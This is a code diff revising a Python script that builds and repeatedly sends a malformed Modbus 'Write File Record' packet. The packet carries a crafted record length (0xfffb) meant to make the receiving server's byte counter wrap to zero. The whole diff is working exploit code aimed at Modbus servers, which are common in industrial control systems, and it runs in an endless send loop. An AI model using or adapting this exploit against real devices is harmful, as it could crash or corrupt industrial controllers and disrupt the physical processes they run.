@@ -7,9 +7,6 @@ import struct
 def create_exploit_packet():
     # Modbus Write File Record header
     function_code = 0x15
-    byte_count = 0x0d  # 13 bytes of data for first group
-
-    # First group
     reference_type_1 = 0x06
     file_number_1 = 0x0001
     record_number_1 = 0x0000
@@ -22,27 +19,21 @@ def create_exploit_packet():
     record_length_2 = 0xfffb  # Cause bytes_processed to become 0
 
     # Construct payload
-    payload = struct.pack('>BBHHHH', 
-                          function_code,
-                          byte_count,
-                          reference_type_1,
-                          file_number_1,
-                          record_number_1,
-                          record_length_1)
+    payload = struct.pack('>B', function_code)
+    payload += struct.pack('>BHHHH',
+                           reference_type_1,
+                           file_number_1,
+                           record_number_1,
+                           record_length_1)
+    payload += b'\x00\x00'  # Minimum 2 bytes of data for the first group
     
-    # Add data for first group (just zeros for simplicity)
-    payload += b'\x00\x00'  # Minimum 2 bytes of data
-    
-    # Add second group
     payload += struct.pack('>BHHHH',
                            reference_type_2,
                            file_number_2,
                            record_number_2,
                            record_length_2)
-    
-    # Add data for second group (just zeros for simplicity)
-    payload += b'\x00\x00'  # Minimum 2 bytes of data
-    
+    payload += b'\x00\x00'  # Minimum 2 bytes of data for the second group
+
     return payload
 
 exploit_packet = create_exploit_packet()
@@ -54,11 +45,17 @@ ss = StreamSocket(s, Raw)
 
 try:
     while True:
-        # Create Modbus TCP packet with the exploit payload
-        modbus_tcp = ModbusADURequest()/Raw(load=exploit_packet)
+        # Create Modbus TCP ADU with the exploit payload
+        transaction_id = 1
+        protocol_id = 0
+        unit_id = 1
+        length = len(exploit_packet) + 1  # +1 for the Unit Identifier
+        
+        modbus_tcp = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + exploit_packet
         
         # Send the packet and receive response
-        response = ss.sr1(modbus_tcp)
+        ss.send(Raw(modbus_tcp))
+        response = ss.recv()
         
         if response:
             print("Response received:")
